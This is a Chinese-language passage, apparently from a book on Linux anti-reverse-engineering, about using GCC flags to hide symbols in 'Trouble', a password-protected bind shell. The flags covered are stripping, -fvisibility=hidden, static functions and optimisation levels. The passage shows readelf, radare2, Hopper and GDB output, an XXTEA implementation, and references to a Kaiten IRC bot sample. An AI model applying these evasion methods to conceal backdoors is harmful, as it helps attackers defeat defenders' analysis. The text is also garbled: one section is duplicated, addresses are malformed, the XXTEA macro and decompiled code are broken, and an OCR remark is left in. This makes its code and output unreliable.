| 4 | 0000000000400298 | 0 SECTION LOCAL DEFAULT | 4 | | |
| 5 | 0000000000400300 | 0 SECTION LOCAL DEFAULT | 5 | | |
| 6 | 0000000000400648 | 0 SECTION LOCAL DEFAULT | 6 | | |
| 7 | 00000000004007a6 | 0 SECTION LOCAL DEFAULT | 7 | | |
| 8 | 00000000004007f0 | 0 SECTION LOCAL DEFAULT | 8 | | |
| 9 | 0000000000400850 | 0 SECTION LOCAL DEFAULT | 9 | | |
| 10 | 0000000000400850 | 0 SECTION LOCAL DEFAULT | 10 | | |
| 11 | 00000000004009d0 | 0 SECTION LOCAL DEFAULT | 11 | | |
| 12 | 00000000004009f0 | 0 SECTION LOCAL DEFAULT | 12 | | |
| 13 | 0000000000400b00 | 0 SECTION LOCAL DEFAULT | 13 | | |
| 14 | 0000000000400b10 | 0 SECTION LOCAL DEFAULT | 14 | | |
| 15 | 0000000000400ed44 | 0 SECTION LOCAL DEFAULT | 15 | | |
| 16 | 00000000004000e0 | 0 SECTION LOCAL DEFAULT | 16 | | |
| 17 | 0000000000400f80 | 0 SECTION LOCAL DEFAULT | 17 | | |
| 18 | 0000000000400fc0 | 0 SECTION LOCAL DEFAULT | 18 | | |
| 19 | 0000000000601e10 | 0 SECTION LOCAL DEFAULT | 19 | | |
| 20 | 0000000000601e18 | 0 SECTION LOCAL DEFAULT | 20 | | |
| 21 | 0000000000601e20 | 0 SECTION LOCAL DEFAULT | 21 | | |
| 22 | 0000000000601e28 | 0 SECTION LOCAL DEFAULT | 22 | | |
| 23 | 0000000000601ff8 | 0 SECTION LOCAL DEFAULT | 23 | | |
| 24 | 0000000000602000 | 0 SECTION LOCAL DEFAULT | 24 | | |
| 25 | 0000000000602098 | 0 SECTION LOCAL DEFAULT | 25 | | |
| 26 | 00000000006020c0 | 0 SECTION LOCAL DEFAULT | 26 | | |
| 27 | 0000000000000000 | 0 SECTION LOCAL DEFAULT | 27 | | |
| 28 | 0000000000000000 | 0 FILE LOCAL DEFAULT | | | `crtstuff.c` |
| 29 | 0000000000601e20 | 0 OBJECT LOCAL DEFAULT | 21 | | `__JCR_LIST__` |
| 30 | 0000000000400b40 | 0 FUNC LOCAL DEFAULT | 14 | | `deregister_tm` |
| 31 | 0000000000400b80 | 0 FUNC LOCAL DEFAULT | 14 | | `register_tm` |
| 32 | 0000000000400bc0 | 0 FUNC LOCAL DEFAULT | 14 | | `do_global_dtors_ax` |
| 33 | 00000000006020c8 | 0 OBJECT LOCAL DEFAULT | 26 | | `completed.7585` |
| 34 | 0000000000601e18 | 0 OBJECT LOCAL DEFAULT | 20 | | `__do_global_dtors_ax_fin` |
| 35 | 0000000000400b40 | 0 FUNC LOCAL DEFAULT | 14 | | `dummy` |
| 36 | 0000000000601e10 | 0 OBJECT LOCAL DEFAULT | 19 | | `__frame_dummy_array` |
| 37 | 0000000000000000 | 0 FILE LOCAL DEFAULT | 16 | | `abs.trouble` |
| 38 | 0000000000400f00 | 0 OBJECT LOCAL DEFAULT | 16 | | `s_password` |
| 39 | 0000000000400000 | 0 FILE LOCAL DEFAULT | 18 | | `crtstuff.c` |
| 40 | 00000000004001d0 | 0 OBJECT LOCAL DEFAULT | 18 | | `__FRAME_END__` |
| 41 | 0000000000601e20 | 0 OBJECT LOCAL DEFAULT | 21 | | `__JCR_END__` |
| 42 | 0000000000000000 | 0 FILE LOCAL DEFAULT | 18 | | `abs` |
| 43 | 0000000000601e18 | 0 NOTYPE LOCAL DEFAULT | 19 | | `__init_array_end` |
| 44 | 00000000006002a0 | 0 OBJECT LOCAL DEFAULT | 25 | | `__dso_handle` |
| 45 | 0000000000601e28 | 0 OBJECT LOCAL DEFAULT | 22 | | `__DYNAMIC` |
| 46 | 0000000000601e10 | 0 NOTYPE LOCAL DEFAULT | 19 | | `__init_array_start` |
| 47 | 0000000000400f00 | 0 NOTYPE LOCAL DEFAULT | 17 | | `__GNU_EF_HDR` |
| 48 | 00000000006002a8 | 0 OBJECT LOCAL DEFAULT | 25 | | `__TMC_END__` |
| 49 | 0000000000600200 | 0 OBJECT LOCAL DEFAULT | 24 | | `__GLOBAL_OFFSET_TABLE__` |
| 50 | 00000000004000d0 | 0 FUNC GLOBAL DEFAULT | 14 | | `__libc_csu_fini` |
| 51 | 0000000000000000 | 0 NOTYPE WEAK DEFAULT | 23 | | `__TTM_deregistercloneTable` |
| 52 | 0000000000600299 | 0 NOTYPE WEAK DEFAULT | 25 | | `data_start` |
| 53 | 00000000006002a8 | 0 NOTYPE GLOBAL DEFAULT | 25 | | `__edata` |
| 54 | 0000000000400ed4 | 0 FUNC GLOBAL DEFAULT | 15 | | `_fini` |
| 55 | 0000000000000000 | 0 FUNC GLOBAL DEFAULT | 25 | | `__stack_chk_fail` |
| 56 | 0000000000000000 | 0 FUNC GLOBAL DEFAULT | 25 | | `htons@GLIBC.2` |
| 57 | 0000000000000000 | 0 FUNC GLOBAL DEFAULT | 25 | | `dup@GLIBC.2.5` |
| 58 | 0000000000000000 | 0 FUNC GLOBAL DEFAULT | 25 | | `htonl@GLIBC.2.5` |
| 59 | 0000000000000000 | 0 FUNC GLOBAL DEFAULT | 25 | | `close@GLIBC.2.5` |
| 60 | 0000000000000000 | 0 FUNC GLOBAL DEFAULT | 22 | | `read@GLIBC.2.5` |
| 61 | 0000000000000000 | 0 FUNC GLOBAL DEFAULT | 22 | | `__libc_start_main` |
| 62 | 0000000000000000 | 0 FUNC GLOBAL DEFAULT | 25 | | `memcmp@GLIBC.2.5` |
| 63 | 0000000000000000 | 0 FUNC GLOBAL DEFAULT | 25 | | `execve@GLIBC.2.5` |
| 64 | 0000000000602098 | 0 NOTYPE GLOBAL DEFAULT | 25 | | `_data_start` |
| 65 | 0000000000000000 | 0 NOTYPE WEAK DEFAULT | 25 | | `__mon_start__` |
| 66 | 000000000040a0e0 | 0 OBJECT GLOBAL DEFAULT | 16 | | `_IO_stdin_used` |
| 67 | 000000000040a060 | 101 FUNC GLOBAL DEFAULT | 14 | | `__libc_csu_init` |
| 68: 0000000000000000 | 0 FUNC GLOBAL DEFAULT | 22 | | `listen@GLIBC.2` |
| 69: 00000000004001d0 | 0 OBJECT GLOBAL DEFAULT | 26 | `_end` |
| 70: 0000000000400b10 | 42 FUNC GLOBAL DEFAULT | 14 | | `_start` |
| 71: 00000000006020a8 | 0 OBJECT GLOBAL DEFAULT | 26 | | `__bss_start` |
| 72: 00000000004002f | 558 FUNC GLOBAL DEFAULT | 14 | | `main` |
| 73: 0000000000000000 | 0 FUNC GLOBAL DEFAULT | UND | | `bind@GLIBC.2.5` |
| 74: 0000000000400000 | 0 FUNC GLOBAL DEFAULT | UND | | `perror@GLIBC.2.5` |
| 75: 0000000000000000 | 0 NOTYPE WEAK DEFAULT | UND | | `___Classes` |
| 76: 0000000000000000 | 0 FUNC GLOBAL DEFAULT | UND | | `accept@GLIBC.2.5` |
| 77: 00000000000400c6 | 41 FUNC GLOBAL DEFAULT | 14 | | `check_password` |
| 78: 0000000000000000 | 0 FUNC GLOBAL DEFAULT | UND | | `fwrite@GLIBC.2.5` |
| 79: 0000000000000000 | 0 NOTYPE WEAK DEFAULT | UND | | `__ITM_deregisterTable` |
| 80: 00000000004009d0 | 0 FUNC GLOBAL DEFAULT | 11 | | `_init` |
| 81: 0000000000000000 | 0 FUNC GLOBAL DEFAULT | UND | | `fork@GLIBC.2.5` |
| 82: 00000000006002c0 | 8 OBJECT GLOBAL DEFAULT | 26 | | `stderr@GLIBC_2.2.5` |
| 83: 0000000000000000 | 0 FUNC GLOBAL DEFAULT | UND | | `socket@GLIBC.2.5` |

在上面的输出中，你应该看到两个符号表：`.dynsym`（动态符号表）和 `.symtab`（符号表）。敏锐的观察者会注意到两点：

- 1. `.symtab` 包含了 `.dynsym` 中存在的许多符号。
- 2. `.symtab` 有许多 `.dynsym` 没有的本地（LOCAL）符号。

第一个线索是这些表是如何不同的。让我们来看看它们的描述。请注意我截断了输出以便对比章节。

## 比较 `.dynsym` 和 `.symtab`

```
albino-lobster@ubuntu:~/antire-book/chap_2_compiler/trouble/build readelf -S /tmp/
```

### 节头：

| [Nr] | Name | Type | Address | Offset | Size | EntSize | Flags | Link | Info | Align |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| [ 5 ] | `.dynsym` | DYNSYM | 00000000000000018 | A | 000000000000 | | | | |
| [29 ] | `.symtab` | SYMBOL | 0000000000000000 | | 000000000000 | 000000000000 | 6 | | |

## 第 2 章：编译器选项

考虑这个恶意软件样本¹⁵¹⁶。

检查该样本中的符号表，你会发现第一个条目之一是 FILE 符号。

### Kaiten SYMTAB 中的初始条目

```bash
```



`albino-lobster@ubuntu:~$ readelf --sym ./09e9fd883f76557efebede8318a0f570a7ad32336b458d701968f84f14284695.bin`

```
'symtab' 包含 116 个条目：

| Num | Value | Size Type | Bind | Vis | Ndx Name |
|---|---|---|---|---|---|
| 0 | 0000000000000000 | @ NOTYPE | LOCAL | DEFAULT | UND |
| 1 | 0000000000000000 | @ FILE | LOCAL | DEFAULT | ABS kaiten.c |
| 2 | 0000000000000000 | @ SECTION | LOCAL | DEFAULT | 1 |
| 3 | 0000000000000000 | @ SECTION | LOCAL | DEFAULT | 3 |
```

`FILE` 符号指向 `kaiten.c`。如果你将其插入，你会发现这是一个非常老旧的名为 Kaiten⁷ 的拒绝服务 IRC 机器人多个版本的源代码。

## 检查添加 `-s` 后的 Trouble

正如本节开头提到的，为了剥离 `SYMTAB`，你需要在编译器标志中添加 `-s`。

> 剥离二进制文件
> 使用 `-s` 标志不是剥离二进制文件的唯一方法。我们将在稍后的“文件格式黑客技巧”章节讨论其他方法。

在添加 `-s` 后重新编译 Trouble 并尝试查看符号。

¹⁵https://malwr.com/analysis/NzINWFhmjRYRKKNFKGjMzINDDBmNGjOG2ZY/
¹⁶https://www.virustotal.com/file/09e9fd883f76557efebede8318a0f570a7ad32336b458d5701968f84f14284695/analysis/147747547/
¹⁷https://packetstorm.com/file/25575/kaiten.html

### Trouble `-s`

```bash
albino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble$ readelf --sym=../tr/trouble
```

符号表 `.dynsym` 包含 35 个条目：

| Num | Value | Size Type | Bind | Vis | Ndx Name |
|---|---|---|---|---|---|
| 0 | 0000000000000000 | | NOTYPE | LOCAL | DEFAULT | UND |
| 1 | 0000000000000000 | | NOTYPE | WEAK | DEFAULT | UND __ITM_deregisterMCCloneTab |
| 2 | 0000000000000000 | | FUNC | GLOBAL | DEFAULT | UND __stack_chain_GLIBC_2.4\_ |
| 3 | 0000000000000000 | | FUNC | GLOBAL | DEFAULT | UND htons@GLIBC_2.2.5) (3) |
| 4 | 0000000000000000 | | FUNC | GLOBAL | DEFAULT | UND dup2@GLIBC_2.2.5) (3) |
| 5 | 0000000000000000 | | FUNC | GLOBAL | DEFAULT | UND htonl@GLIBC_2.2.5) (3) |
| 6 | 0000000000000000 | | FUNC | GLOBAL | DEFAULT | UND close@GLIBC_2.2.5) (3) |
| 7 | 0000000000000000 | | FUNC | GLOBAL | DEFAULT | UND read@GLIBC_2.2.5) (3) |
| 8 | 0000000000000000 | | FUNC | GLOBAL | DEFAULT | UND __start_main@GLIBC_2.4 |
| 9 | 0000000000000000 | | FUNC | GLOBAL | DEFAULT | UND memcmp@GLIBC_2.2.5) (3) |
| 10 | 0000000000000000 | | FUNC | GLOBAL | DEFAULT | UND execve@GLIBC_2.2.5) (3) |
| 11 | 0000000000000000 | | NOTYPE | WEAK | DEFAULT | UND __mon_start_ |
| 12 | 0000000000000000 | | FUNC | GLOBAL | DEFAULT | UND listen@GLIBC_2.2.5) (3) |
| 13 | 0000000000000000 | | FUNC | GLOBAL | DEFAULT | UND bind@GLIBC_2.2.5) (3) |
| 14 | 0000000000000000 | | FUNC | GLOBAL | DEFAULT | UND error@GLIBC_2.2.5) (3) |
| 15 | 0000000000000000 | | NOTYPE | WEAK | DEFAULT | UND __register_cl |
| 16 | 0000000000000000 | | FUNC | GLOBAL | DEFAULT | UND accept@GLIBC (3) |
| 17 | 0000000000000000 | | FUNC | GLOBAL | DEFAULT | UND fwrite@GLIBC_2.2.5) (3) |
| 18 | 0000000000000000 | | NOTYPE | WEAK | DEFAULT | UND __ITM_register_MCCloneTable |
| 19 | 0000000000000000 | | FUNC | GLOBAL | DEFAULT | UND fork@GLIBC_2.2.5) (3) |
| 20 | 0000000000000000 | | FUNC | GLOBAL | DEFAULT | UND socket@GLIBC_2.2.5) (3) |
| 21 | 00000000004062a8 | | NOTYPE | GLOBAL | DEFAULT | 25 .data |
| 22 | 000000000040629b | | NOTYPE | GLOBAL | DEFAULT | 25 .data_start |
| 23 | 00000000004062d0 | | NOTYPE | GLOBAL | DEFAULT | 26 .end |
| 24 | 0000000000404c06 | | 41 FUNC | GLOBAL | DEFAULT | 14 check_password |
| 25 | 0000000000406209f | | NOTYPE | WEAK | DEFAULT | 25 data_start |
| 26 | 00000000004040e0 | | OBJECT | GLOBAL | DEFAULT | 16 _IO_stdin_used |
| 27 | 00000000004048d0 | | 101 FUNC | GLOBAL | DEFAULT | 14 __libc_csu_init |
| 28 | 0000000000400b10 | | 42 FUNC | GLOBAL | DEFAULT | 14 _start |
| 29 | 00000000004020a8 | | NOTYPE | GLOBAL | DEFAULT | 26 .bss_start |
| 30 | 00000000004002cf2 | | 558 FUNC | GLOBAL | DEFAULT | 14 main |
| 31 | 00000000004009d0 | | FUNC | GLOBAL | DEFAULT | 11 .init |
| 32 | 00000000004062c0 | | 8 OBJECT | GLOBAL | DEFAULT | 26 stderr@GLIBC_2.2.5) (3) |
| 33 | 0000000000400ed0 | | 2 FUNC | GLOBAL | DEFAULT | 14 __libc_csu_fini |
| 34 | 00000000000400ed4 | 0 FUNC | GLOBAL DEFAULT | 15 .fini |

如你所见，整个 `.symtab` 现在都消失了。这不仅让二进制文件更小，还完全删除了二进制文件中对 `s_password` 的简单访问。

### `-fvisibility`

### 查看 `FUNC` 符号

在上一节中，你删除了 `.symtab` 以防止逆向工程师获取有用数据。但是，如果你查看 `.dynsym`，你仍然会找到有用信息。具体是这两个符号：

- 24: `0000000000400c06 41 FUNC GLOBAL DEFAULT 14 check_password`
- 30: `0000000000400c2f 558 FUNC GLOBAL DEFAULT 14 main`

这些 `FUNC` 符号与 Trouble 中的 `main()` 和 `check_password()` 函数相关。`.dynsym` 提供了函数的起始地址及其大小。这些对于反汇编器是非常有用的。例如，在 Radare2 中查看 `check_password()` 函数，可以很容易地找到 Radare2 的视图：

```bash
albino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ radare2 ./trouble
```

通过偏移 `@` 在临时偏移上执行命令。

```
0x040b10> aaa

[x] Analyze all flags with sym, and entry(aa)
[x] Analyze bytes for references (aar)
[x] Analyze function calls (aac) 使用 aaaa 进行分析。
[x] Construct a function name for func.* and sym.* (aan)

0x040b10> pdf @ sym.check_password (fcn) sym.check_password 41
```

```assembly
; int local_8 @ rbp-8
; CALL XREF from 0x0004dc3 (sym.main)

0x00400c06 55 push rbp
0x00400c07 4889e5 mov rbp, rsp
0x00400c0a 4883ec10 sub rsp, 0x10
0x00400c0e 488975d8 mov [rbp-local_8], rdi
0x00400c12 48b45f5 mov rax, qword [rbp-local_8]
0x00400c16 b200000 mov edx, 0x20
0x00400c1b 4896c6 mov rsi, rax
0x00400c1e bf00f40 mov edi, str.password
0x00400c23 a8e4fff call sym.memcmp
0x00400c28 85c0 test eax, eax
0x00400c2a 0f95c0 setne al
0x00400c2d c9 leave
0x00400c2e c3 ret
```

你漏掉了它，在 `0x4000c1` 你可以看到列为 `password` 的 `s_password` 内容。

### 隐藏 `FUNC` 符号

从上面所示，bind shell 的密码很容易获取。然而，你可以使用 GCC 编译标志来移除 `check_password` 符号，并防止逆向工程师轻松导出密码。GCC 标志是 `"visibility-hidden"`⁸，当你将其添加到 Trouble 的编译器选项时，它看起来像这样：

```cmake
set(CMAKE_FLAGS "-Wall -Wextra -Wshadow -s -visibility=hidden -std=gnu11")
```

使用 `-visibility=hidden` 将隐藏所有可能的符号。这意味着在 Trouble 中 `check_password()` 将隐藏。

### 静态函数

我们可以通过在函数定义中使用 `static` 关键字来隐藏 `check_password` 符号。事实上，如果一个函数不需要在文件（或编译单元）外部使用，将函数设为 `static` 被认为是最佳实践。

>⁸https://gcc.gnu.org/onlinedocs/gcc-4.6.0/gcc/Code-Gen-Options.html

如果你在添加可见性标志后重新编译 Trouble 并使用 reread 查看 `.dynsym`，你会发现 `main()` 和 `check_password()` 都不存在了。从 Trouble 的 `DYNSYM` 中移除 `main()` 有一个有趣的副作用：GDB 不再能够在 `main()` 处断点。

### GDB 等待 main

```bash
albino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ gdb .trouble
GNU gdb (Ubuntu 7.11.1-0ubuntu6.1) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3: GNU GPL version 3 or later <http://www.gnu.org/licenses/gpl.html>
此软件是免费的：你可以更改并重新分发它。
在法律允许范围内不提供任何保证。输入 "show copying" 和 "show warranty" 详情。
此 GDB 配置为 "x86_64-linux-gnu"。
输入 "show configuration" 查看配置详情。
有关错误报告说明，请参阅：
<http://www.gnu.org/software/gdb/bugs/.
在以下位置查找 GDB 手册和其他文档资源：
<http://www.gnu.org/software/gdb/documentation/>
如需帮助，输入 "help"。输入 "apropos word" 搜索与 "word" 相关的命令。

(gdb) start
Function "main" not defined.
Make breakpoint pending on future shared library load? (y or [n]) y
Temporary breakpoint 1 (main) pending.
Starting program: /home/albino-lobster/antire_book/chap_2_compiler/trouble/build/trou
```

## 第 2 章：编译器选项

### Radare2 无 `check_password()` 情况

```bash
albino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ radare2 .trouble
-- 现在支持 NOSQL！

+   [0x04000ad0> aaa
[x] 分析所有以 sym. 和 entry@ 开头的标志 (aa)
[x] 分析指令的字节长度以查找引用 (aar)
[x] 分析函数调用 (aac)
[ ] * 使用 -AA 或 aaaa 执行额外的实验性分析。
[x] 为 fcn.* 和 sym.func.* 函数构造函数名 (aan)

[0x04000ad0> pdf @ sym.check_password
无效地址 (sym.check_password)

[0x04000ad0> pdf @ sym.main
无效地址 (sym.main)
```

Radare2 无法直接对 `sym.main` 工作，但它足够聪明，根据 ELF 入口存根（entry stub）找到 `main()`。通过在 Radare2 中使用 `"pdf @ main"` 命令，你可以查看 `main()`，并找到 `check_password()` 最终何被调用。观察由于使用了 `-fvisibility-hidden`，对 `check_password()` 的调用发生了什么变化。

### Radare2：未使用 `-fvisibility=hidden` 时的 `check_password` 调用

```
| | | | | | ; JMP XREF 源自 0x04000da6 (sym.main) |
| | | | | | ---> 0x04000dbc 488d45d0 lea rax, [rbp - local_30] |
| | | | | | 0x04000dc0 4889c7 mov rdi, rax |
| | | | | | 0x04000dc3 e83efffff call sym.check_password |
| | | | | | 0x04000dc8 84c0 test al, al |
| | ,====< 0x04000dca 7411 je 0x0400ddd |
```

### Radare2：使用 `-fvisibility=hidden` 时的 `check_password` 调用

```
|||| ; JMP XREF 源自 0x04000d66 (main)

|'----> 0x04000d7c      488d45d0      lea, [rbp - local_30h]

|       0x04000d80      4889c7      mov rdi, rax
```



# 第 2 章：编译器选项

注意之前的反汇编代码，二进制文件显然地调用了 `sub.memcmp_bc6`（自动生成的函数名）。相比之下，Hopper 输出的是 `check_password()` 的地址。

Hopper 看到的带有 `-fvisibility-hidden` 的 `check_password()` 调用：

```
0000000000000d7c lea      rax, qword [ss:rbp+var_30] ; XREF=sub_400bef+375
0000000000000d80 mov      rdi, rax                   ; 参数 #1
0000000000000d83 call     sub_400bc6
0000000000000d88 test     al, al
0000000000000d8a je       0x0400d9d
```

许多逆向工程师依赖这些函数名来为二进制文件提供额外的上下文信息。如果没有了这些额外信息，逆向工程师只能自己去推索。

## -O

一个经常被忽视的话题是优化。你通过优化标志来控制编译器尝试提高程序性能或减小体积的多种方式。标志有很多，因此 GCC 将许多标志合并到不同的 `-O` 标志下是很有帮助的。虽然有更多的 `-O` 标志，但我认为以下是最有用的：

- `-O1`：使用 `-O1`，编译器尝试减少代码大小和执行时间，但不会进行任何耗费大量编译时间的优化。
- `-O2`：进一步优化。GCC 执行几乎所有支持的不涉及空间与速度权衡的优化。
- `-O3`：`-O3` 中的所有优化已经包含了其他许多优化的效果。
- `-Os`：所有不增加代码大小的优化。它还会执行旨在减少代码大小的进一步优化。

## 编写良好的代码

优化的问题之一是它们会破坏编写得糟糕的程序。我认为程序员并不经常讨论或完全理解优化级别，因为许多人写的代码太差，至于即使他们想用优化也无法使用。如果你要写代码，就请务必写好。编译时使用 `-Wall` 和 `-Wextra`。使用 CPPCheck 进行静态分析。使用 Valgrind 进行运行时分析。这些是编写高质量 C 或 C++ 代码的底线，但我很少看到专业人士使用这些任何一种工具。

## 修正后的微型加密算法 (XXTEA)

在本节中，优化作为反逆向工程工具的用处通过任何加密算法得到最好的体现。因此，我用 C 语言实现了修正后的微型加密算法 (XXTEA)。我的实现基于 Wikipedia 页面上的参考代码。XXTEA 是一个很好的例子，因为正如它的名字所示，它非常小！你可以在名为 `tea` 的目录中找到 XXTEA 的源码。此外，`tea` 使用 CMake 进行编译。该项目中只有两个文件：`tea.c` 和 `CMakeLists.txt`。

`chap_2_compiler/tea/CMakeLists.txt`：

```
project(tea)

cmake_minimum_required(VERSION 3.0)

set(CMAKE_C_FLAGS "-Wall -Wextra -Wshadow -std=gnu11")

add_executable($PROJECT_NAME src/tea.c)
```

`chap_2_compiler/tea/src/tea.c`：

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/**
* 这是修正后的微型加密算法（又称 
* XXTEA）。XXTEA 是由 David Wheeler 和 Roger
* Needham 设计的一种简单块加密算法，它解决了原始 BTEA 实现中的问题。
* 该算法首次于 1998 年发表。
*
* 代码基于参考代码，你可以轻松地在以下找到它：
* https://en.wikipedia.org/wiki/XXTEA
*
* 注意：不要尝试用这种算法来保护你的数据。这只是一个
* 用于说明优化对代码影响的玩具。
*/

#define DELTA 0x9e3779b9
#define MX ((z>>>5^y<<2)) + (y>>>3<<4)) ^ ((sum^y) + (key[(p&3)] ^ z))

void btea_encrypt(uint32_t *v, int n, uint32_t const key[4])
{
    uint32_t sum = 0;
    for (unsigned rounds = 6 + 52/n; rounds > 0; --rounds) {
        uint32_t z = v[n-1];
        uint32_t y = 0;
        unsigned p = 0;
        sum += 0x9e3779b9;
        unsigned e = (sum >> 2) & 3;
        for ( ; (int)p < n - 1; p++) {
          y = v[p+1];
          v[p] += MX;
          z = v[p];
        }
        y = v[0];
        v[n - 1] += MX;
        z = v[n - 1];
    }
}

void btea_decrypt(uint32_t *v, int n, uint32_t const key[4]) {
  unsigned rounds = 6 + 52/n;
  uint32_t sum = rounds * DELTA;
  uint32_t y = v[0];
  uint32_t z = 0;
  do {
    sum -= 0x9e3779b9;
    unsigned e = (sum >> 2) & 3;
    for (int p = n - 2; p >= 0; p--) {
      z = v[p];
      v[p] -= MX;
      y = v[p+1];
    }
    y = v[0];
    v[n - 1] -= MX;
  } while (--rounds);
}
```

## 构建 tea

```
Scanning dependencies of target tea
[50%] Building object CMakeFiles/dir/src/tea.o
[100%] Linking executable
[100%] Built target tea

ino-lobster@ubuntu:~/antire_book/chap_2_compiler/build$ ./tea
plaintext:0x61 0x62 0x63 0x66 0x65 0x66 0x67 0x6c 0x6d 0x6e 0x6f 0x31 0x33
encrypted:0x05 0x8c 0x17 0x46 0x56 0x52 0x54 0x0a 0xe9 0x82 0xf7 0x27 0x40/xfd
```

## -Os

让我们玩玩优化选项。有时候，生成最小的二进制文件是有用的。`-Os` 对此很有用，因为正如之前提到的，它强调了代码大小。关于编译器标志：

```
set(CMAKE_C_FLAGS "-Wall -Wextra -Wshadow -Os -std=gnu9")
```

使用 `-Os` 重新编译并在 Radare2 中查看 `btea_encrypt()`，你会发现该函数变得小得多了。

### `btea_encrypt()` 的 `-Os` 版本的尺寸

```
albino-Lobster@ubuntu:~/antire_book/chap_2_compiler/tea/build$ radare2 /tea

-- 在视觉模式下使用 'I' 键反转块字节

[0x04007f0]> aaa
[x] 分析所有以 sym 开头的行和 entry0 (aa)
[x] 分析指令长度字节以查找引用 (aar)
[x] 分析函数调用 (aac)
[ ] 使用 -AA 或 aaa 执行额外的实验性分析。
[x] 为 fcn.* 和 sym.func.* 函数构造函数名 (aan)
[0x04007f0]> pdf @ sym.btea_encrypt
/ (fcn) sym.btea_encrypt
```

`btea_encrypt` 的尺寸从 472 字节降到了 216 字节！这令人印象深刻。它在 Hopper 的反编译器中看起来什么样？

### `btea_encrypt()` 的 `-Os` 版本反编译版本

```
int btea_encrypt(int arg0, int arg1, int arg2) {
    var_28 = arg0;
    var_2C = arg1;
    var_38 = arg2;
    var_18 = 0x0;
    rax = 0x34 / var_2C + 06;
    for (var_14 = rax; var_14 != 0x0; var_14 = var_14 - 0x1) {
        _10 = *(int32_t *)(var_28 + (sign_extend_32(var_2C)) << 02) + 0xffffffffff;
        var_C = 0x0;
        var_18 = var_18 = 0x61c8647;
        var_4 = var_18 >> 2 & 0x3;
        while (var_2C + var_C) {
            var_8 = *(int32_t *)(var_28 + (var_C + 0) * 0x4);
            *((int32_t *)(var_C * 0x4 + var_4) * 0x4) ^ var_10) + (var_18 ^ var_8) ^ (var_10 >> 0x5 ^ var_8 >> 0x2) + (var_10 << 0x4 ^ var_8 >> 0x3)) + *(int32_t *)(var_28 + var_C * 0x4);
            var_10 = *(int32_t *)(var_28 + var_C *
            var_C = var_C + 0x1;
            var_8 = *(int32_t *)(var_28;
            *(int32_t *)(var_28 + (sign_extend_32(var_2C) << 0x2) +
            0xffffffffffff = ((*(int32_t *)(var_38 +
            (var_C & 0x3 ^ var_4) ^ (var_10) ^ var_18 ^ var_8) ^
            (var_10 >> 0x5 ^ var_8 << 0x2 + (var_10 << 0x4 ^ var_8 >> 0x3)) +
            *(int32_t *)(var_28 + (sign_extend_32(var_2C) << 0x2) +
            0xfffffffffffffffc;
            rax = *(int32_t *)(var_28 + (sign_extend_32(var_2C) << 0x2) +
            0xfffffffffffffffc;
        }
    }
}
```

对于那些不熟悉编译器的人来说，我确定你对反编译后的 C 代码的反应只有“哇”。是的，它确实很丑。然而，考虑到 `btea_encrypt` 依赖于这个宏：

```
#define MX ((z>>5^y<<2)) + (y>>3^z<<4)) ^ ((sum^y) + (key[(p&3)]))
```

上面的代码就相当合理了。



使用 `-Os` 重新编译并在 Radare2 中查看 `btea_encrypt()`，你会发现该函数变得小得多了。

### `btea_encrypt()` 的 `-Os` 版本的尺寸

```
albino-Lobster@ubuntu:~/antire_book/chap_2_compiler/tea/build$ radare2 /tea

-- 在视觉模式下使用 'I' 键反转块字节

[0x04007f0]> aaa

[x] 分析所有以 sym 开头的行和 entry0 (aa)

[x] 分析指令长度字节以查找引用 (aar)

[x] 分析函数调用 (aac)

[ ] 使用 -AA 或 aaa 执行额外的实验性分析。

[x] 为 fcn.* 和 sym.func.* 函数构造函数名 (aan)

[0x04007f0]> pdf @ sym.btea_encrypt

/ (fcn) sym.btea_encrypt
```

`btea_encrypt` 的尺寸从 472 字节降到了 216 字节！这令人印象深刻。它在 Hopper 的反编译器中看起来什么样？

### `btea_encrypt()` 的 `-Os` 版本反编译版本

```
int btea_encrypt(int arg0, int arg1, int arg2) {

var_28 = arg0;

var_2C = arg1;

var_38 = arg2;

var_18 = 0x0;

rax = 0x34 / var_2C + 06;

for (var_14 = rax; var_14 != 0x0; var_14 = var_14 - 0x1) {

_10 = *(int32_t *)(var_28 + (sign_extend_32(var_2C)) << 02) + 0xffffffffff;

var_C = 0x0;

var_18 = var_18 = 0x61c8647;

var_4 = var_18 >> 2 & 0x3;

while (var_2C + var_C) {

var_8 = *(int32_t *)(var_28 + (var_C + 0) * 0x4);

*((int32_t *)(var_C * 0x4 + var_4) * 0x4) ^ var_10) + (var_18 ^ var_8) ^ (var_10 >> 0x5 ^ var_8 >> 0x2) + (var_10 << 0x4 ^ var_8 >> 0x3)) + *(int32_t *)(var_28 + var_C * 0x4);

var_10 = *(int32_t *)(var_28 + var_C *

var_C = var_C + 0x1;

var_8 = *(int32_t *)(var_28;

*(int32_t *)(var_28 + (sign_extend_32(var_2C) << 0x2) +

0xffffffffffff = ((*(int32_t *)(var_38 +

(var_C & 0x3 ^ var_4) ^ (var_10) ^ var_18 ^ var_8) ^

(var_10 >> 0x5 ^ var_8 << 0x2 + (var_10 << 0x4 ^ var_8 >> 0x3)) +

*(int32_t *)(var_28 + (sign_extend_32(var_2C) << 0x2) +

0xfffffffffffffffc;

rax = *(int32_t *)(var_28 + (sign_extend_32(var_2C) << 0x2) +

0xfffffffffffffffc;
```
(Note: The OCR text cuts off at the end of the provided source).

```c
*(int32_t *)stack[2042] = rax;

} while (r1 != var_-8);

}

return rax;

}
```

真的没什么可说的。更高的优化级别可以生成更复杂的代码。

### `-funroll-loops`

如果目标是生成越来越长且越复杂的代码，那么 `-funroll-loops` 是非常有用的。`-funroll-loops` 会“展开（unroll）”或撤销任何次数可以在编译时确定的循环迭代的循环结构。

在上一节内容的基础上，你应该在 `-O3` 之后添加 `-funroll-loops`。

```cmake
set(CMAKE_C_FLAGS "-Wall -Wextra -Wshadow -O3 -funroll-loops -std=gnu11)
```

现在，如果你重新编译并在 Radare2 中查看 `btea_encrypt()` 的大小，你会发现该函数膨胀到了 800 字节！

`-O3 -funroll-loops` `btea_encrypt()` 的大小

```
+ albino-lobster@ubuntu:~~/antire_book/chap_2_compiler/tea/build$ radare2 ./tea
- Learn pascal as if you were radical
[0x00400ad0]> aaa
[x] Analyze all flags starting with them, and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
